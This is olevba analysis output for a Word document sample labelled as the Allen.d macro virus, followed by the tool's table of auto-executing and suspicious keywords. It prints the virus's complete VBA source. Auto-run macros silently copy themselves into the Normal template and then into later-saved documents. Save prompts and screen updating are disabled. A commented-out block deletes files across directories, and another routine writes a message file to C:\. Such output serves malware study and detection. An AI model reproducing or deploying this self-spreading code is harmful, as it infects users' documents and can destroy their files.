olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Allen.d-85f5fcdf6d5ba356460f9eb5a7f2ef63c7debd2f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Allen.d-85f5fcdf6d5ba356460f9eb5a7f2ef63c7debd2f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Allen.d-85f5fcdf6d5ba356460f9eb5a7f2ef63c7debd2f - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim sMe$
Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim check
sMe$ = ""
'Find where is the Normat.Dot  placed !
'   Normal$ = FindNormal$(WhereNormal$)
'   sMe$ = Normal$
'   Print "I got you in :" + Normal$
'   Print " Now I will try to infect your global template !"
'*****
    check = Checking
'Disabled the options user prompt
    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    If check = 0 Then
        'MsgBox "ra ono we"
        JustDoIt
        'MFN$ = MacroFileName$("AutoOpenVir")
        'MsgBox mfn$
        'FileOpen .Name = MFN$, .AddToMru = 0
        'DocClose 1
    Else
        'MsgBox " ono we "
        GoTo EndSub
    End If

'*****
'   JustDoIt
'save changes to Normal now
    'this is embarasing
    'FileOpen .Name = Normal$, .AddToMru = 0
    'FileClose 1
EndSub:
End Sub

Private Sub JustDoIt()
Dim CopyM
WordBasic.ScreenUpdating 0
' CopyM is gratuitous, but could be used for error trapping in future
' versions. We currently set it to "1" if the function succeeds,
' otherwise it's "0".
' otherwise it's "0".  Dest/Global <----- source/file
CopyM = CopyMacros("Ofxx", "AutoOpen")
CopyM = CopyMacros("AutoExec", "Show")
CopyM = CopyMacros("AutoClose", "Cfxx")
'CopyM = CopyMacros("AutoCloseVir", "AutoCloseVir")

WordBasic.ScreenUpdating 1
End Sub

'Funtion Infection Normal template with macro virus
Private Function CopyMacros(CurMacroName$, ScanMacroName$)
Dim cfn$
Dim mfn$

cfn$ = WordBasic.[FileName$]()
mfn$ = WordBasic.[MacroFileName$](CurMacroName$)
If mfn$ <> "" And mfn$ <> "Built In" Then '****disini yang mbingungi
    If (CurMacroName$ = "AutoOpen") Or (CurMacroName$ = "Ofxx") _
    Then
    '*************************************************
    'tambahan disini
    '   MacroCopy "Global:" + CurMacroName$, \
    '   cfn$ + ":" + ScanMacroName$
    '   Goto EndFunc
    'Else
    'tambahan disini
    '   MacroCopy cfn$ + ":" + ScanMacroName$, \
    '   "Global:" + CurMacroName$
    '*************************************************
        GoTo EndFunc
    End If
End If
WordBasic.MacroCopy cfn$ + ":" + ScanMacroName$, _
    "Global:" + CurMacroName$, 1
' Successful copy with "Execute Only"  attribute
CopyMacros = 1
EndFunc:    'Just ended
End Function

'Function Find doit Kid !
Private Function FindNormal$(WhereNormal$)
    WordBasic.ScreenUpdating 0
    WordBasic.ToolsMacro Name:="WhereIsNormal", Edit:=1, Show:=1
    WordBasic.Insert "REM Where are you?"
    WordBasic.DocClose 1
    FindNormal$ = WordBasic.[MacroFileName$]("WhereIsNormal")
    WordBasic.ToolsMacro Name:="WhereIsNormal", Show:=1, Delete:=1
    WordBasic.ScreenUpdating 1
End Function

Private Function Checking()
Dim CMac
Dim Count_
Dim exist$
CMac = WordBasic.CountMacros(0)
For Count_ = 1 To CMac
    'pos = pos + count
    exist$ = WordBasic.[MacroName$](Count_, 0)
    If exist$ = "Ofxx" Then
            'MsgBox "Already infected"
            Checking = 1
    Else
            'MsgBox "It Cleant"
    End If
Next
End Function

-------------------------------------------------------------------------------
VBA MACRO Show_.bas 
in file: Virus.MSWord.Allen.d-85f5fcdf6d5ba356460f9eb5a7f2ef63c7debd2f - OLE stream: 'Macros/VBA/Show_'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim pukul$
Dim hari
Dim tgl
Dim bulan
Dim tahun
Dim hari_$
Dim bulan_$
Dim tgl_$
Dim tahun_$
Dim Semua$
Dim Bacalah$
'tgl = Day(Now())
'jam = Hour(Now())
'If tgl < 20 Then Goto Selamat
'If jam < 11 Then Goto Selamat
'Dim Sehat$(20)
'Dim Subur$(20)
'ChDir "C:\"
'Dim subdirs$(CountDirectories())
'subdirs$(0) = "[..]"
'For i = 1 To CountDirectories()
'   Print "Reading menu...Please wait !"
'   Subdirs$(i) = UCase$(GetDirectory$(i))
'   If Subdirs$(i) = "WINDOWS" Then Goto lewat
'   If Subdirs$(i) = "WINWORD" Then Goto lewat
'   If Subdirs$(i) = "WINWORD6" Then Goto lewat
'   Ojek$ = "C:\" + Subdirs$(i) + "\*.*"
'   Kill ojek$
'   ChDir  Subdirs$(i)
'       Subur$(0) = "[..]"
'       For a = 1 To CountDirectories()
'           Print "Reading menu...Please wait !"
'           subur$(a) = UCase$(GetDirectory$(a))
'           If subur$(a) = "WINWORD" Then Goto pass
'           If subur$(a) = " WINWORD6" Then Goto pass
'           Penyakit$ = "C:\" + subdirs$(i) + "\" + subur$(a) + "\*.*"
'           Kill Penyakit$
'   ChDir subur$(a)
'       sehat$(0) = "[..]"
'               For b = 1 To CountDirectories()
'               Print "Reading menu...Please wait !"
'               sehat$(b) = UCase$(GetDirectory$(b))
'               Tien$ = "C:\" + Subdirs$(i) + "\" + Subur$(a) + "\" + 'Sehat$(b) + "\*.*"
'           Kill Tien$
'           Next b
'           ChDir "C:\" + subdirs$(i)
'PASS:
'       Next a
'       ChDir "C:\"
'lewat:
'Next i
pukul$ = WordBasic.[Time$](WordBasic.Now())
hari = WordBasic.Weekday(WordBasic.Now())
tgl = WordBasic.Day(WordBasic.Now())
bulan = WordBasic.Month(WordBasic.Now())
tahun = WordBasic.Year(WordBasic.Now())
ReDim hari___$(7)
ReDim bulan___$(12)
If hari = 1 Then hari_$ = "Minggu"
If hari = 2 Then hari_$ = "Senin"
If hari = 3 Then hari_$ = "Selasa"
If hari = 4 Then hari_$ = "Rabu"
If hari = 5 Then hari_$ = "Kamis"
If hari = 6 Then hari_$ = "Jumat"
If hari = 7 Then hari_$ = "Sabtu"
If bulan = 1 Then bulan_$ = "Januari"
If bulan = 2 Then bulan_$ = "Februari"
If bulan = 3 Then bulan_$ = "Maret"
If bulan = 4 Then bulan_$ = "April"
If bulan = 5 Then bulan_$ = "Mei"
If bulan = 6 Then bulan_$ = "Juni"
If bulan = 7 Then bulan_$ = "Juli"
If bulan = 8 Then bulan_$ = "Agustus"
If bulan = 9 Then bulan_$ = "September"
If bulan = 10 Then bulan_$ = "Oktober"
If bulan = 11 Then bulan_$ = "November"
If bulan = 12 Then bulan_$ = "Desember"
tgl_$ = Str(tgl)
tahun_$ = Str(tahun)
Semua$ = hari_$ + ", " + tgl_$ + " " + bulan_$ + " " + tahun_$ + ", Jam :" + pukul$ + "."
'Pesan$ = "Anda rupanya sedang sial, semua file di mesin ini kecuali yang berada di direktori WINDOWS dan WINWORD telah hilang, jangan kaget, ini bukan ulah Anda, tapi ini hasil pekerjaan saya...Barang siapa yang berhasil menemukan cara menangkal virus ini
', saya aka" + "n memberi listing virus ini untuk Anda !!! Dan tentu saja saya akan terus datang kesini untuk memberi Anda salam dengan virus-virus terbaru dari saya...selamat !   Bandung, " + semua$
Bacalah$ = "Assalamualaikum ..., maaf @Rapi.Kom mengganggu anda sebentar. Pesan ini aslinya bernama  PESAN.TXT  yang  muncul  di  root direktori  setelah  anda menjalankan Winword 6.0 yang templatenya (normal.dot)  telah  tertulari  macro  menjijikkan ini. Macro ini " + "(sebe" + "lum @R" + "a" + "pi" + ".Kom modifikasi)  berasal  dari  file data Winword 6.0 (*.doc) yang telah tertular macro ini. Bila file data tersebut  di pangggil (Open doc), maka macro secara otomatis menjalankan perintah-perintah macro lain nya,  yang antara  lain mengcopykan  diri ke" + " gl" + "o" + "bal " + "template (normal.dot), juga pada tanggal dan jam tertentu akan menghapus semua data di direktori tingkat 1, 2 dan 3 (kecuali Hidden direktori), menjengkelkan bukan ?!. Siapapun pembuatnya pastilah orang yang sirik !,  masih banyak perbuatan baik lain yang" + "  bisa  kita kerjakan.         ... Malang, " + Semua$ + " @Rapi.Kom"
Open "C:\BACALAH.TXT" For Output As 1
Write #1, Bacalah$
Close 1
'Selamat:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Cfxx.bas 
in file: Virus.MSWord.Allen.d-85f5fcdf6d5ba356460f9eb5a7f2ef63c7debd2f - OLE stream: 'Macros/VBA/Cfxx'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim check
    check = Checking
    If check = 0 Then
        'MsgBox "ra ono we, U can delete this mess later"
        'JustDoIt'infect it
        SaveIt
    Else
        'MsgBox " ono we, U can delete this mess later "
        'do nothing & we must close it now
        'file Close 2
    End If
'   JustDoIt
'   SaveIt
End Sub

Private Sub SaveIt()
Dim Fn$
    'Get the active filename
     Fn$ = WordBasic.[FileName$]()
    'MsgBox cFn$, "You can delete this Message later !"
    
    Dim Dlg As Object: Set Dlg = WordBasic.DialogRecord.FileSaveAs(False)
    If (Dlg.Format <> 1) Then
        'MsgBox " not a template, so we must save as template"
        WordBasic.FileSaveAs Format:=1  ', .AddToMru = 0
        'Save it Now
        'MsgBox "File Successfully Saved"
        JustDoIt
        WordBasic.FileSave
        'Goto EndSub
    Else
    ' if we get here, all is well
        'MsgBox "Yes we can infect it right now"
        'MsgBox "Check for infection.."
        'mfn$ = MacroFileName$("AutoOpenVir")
        'If Mfn$ = fn$ Then
        'MsgBox "Yes The virus was installed."
        'Else
            'FileSaveAs .Name
            'MsgBox "Installing virus to template"
            JustDoIt
            WordBasic.FileSave
            'FileClose 1
            'MsgBox "File Successfully Saved"
            'Goto EndFunc
        'EndIf
    End If
EndSub:
End Sub

Private Sub JustDoIt()
Dim CopyM
WordBasic.ScreenUpdating 0
' CopyM is gratuitous, but could be used for error trapping in future
' versions. We currently set it to "1" if the function succeeds,
' otherwise it's "0". Source/Global ---> Dest/Infected
CopyM = CopyMacros("Ofxx", "AutoOpen")
CopyM = CopyMacros("AutoClose", "Cfxx")
CopyM = CopyMacros("AutoExec", "Show")
'CopyM = CopyMacros("AutoOpenVir", "AutoOpenVir")
'CopyM = CopyMacros("AutoCloseVir", "AutoCloseVir")

WordBasic.ScreenUpdating 1
End Sub

'Funtion Infection Normal template with macro virus
Private Function CopyMacros(CurMacroName$, ScanMacroName$)
Dim cfn$

cfn$ = WordBasic.[FileName$]()
'Print cfn$
'mfn$ = MacroFileName$(CurMacroName$)
'If mfn$ <> "" And mfn$ <> "Built In" Then'****disini yang mbingungi
'   If (CurMacroName$ = "AutoOpen") Or (CurMacroName$ = "AutoClose") 'Then
'       Goto EndFunc
'   Else
    'tambahan disini
        WordBasic.MacroCopy "Global:" + CurMacroName$, _
        cfn$ + ":" + ScanMacroName$
        'Goto EndFunc
    'End If
'End If
'MacroCopy cfn$ + ":" + ScanMacroName$, \
 '  "Global:" + CurMacroName$
' Successful copy
CopyMacros = 1
'EndFunc:   'Just ended
End Function

Private Function Checking()
Dim CountMacr
Dim Count_
Dim exist$
CountMacr = WordBasic.CountMacros(1) 'active template
For Count_ = 1 To CountMacr
    'pos = pos + count
    exist$ = WordBasic.[MacroName$](Count_, 1)
    If exist$ = "Show" Then
            'MsgBox "Already infected"
            Checking = 1
    Else
            'MsgBox "It Cleant"
    End If
Next
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|doit                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

